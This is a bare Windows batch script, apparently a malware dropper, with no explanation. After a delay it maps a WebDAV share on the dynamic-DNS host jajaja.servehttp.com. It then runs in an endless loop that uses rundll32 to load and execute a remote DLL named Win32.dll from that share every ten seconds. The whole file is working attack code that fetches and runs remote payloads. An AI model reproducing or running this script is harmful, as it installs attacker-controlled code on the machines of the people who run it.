@echo off
timeout 60
net use C: \\jajaja.servehttp.com\webdav /persistent:no
net use C: /delete
:start
rundll32.exe \\jajaja.servehttp.com\webdav\Win32.dll,Run
timeout 10
goto start
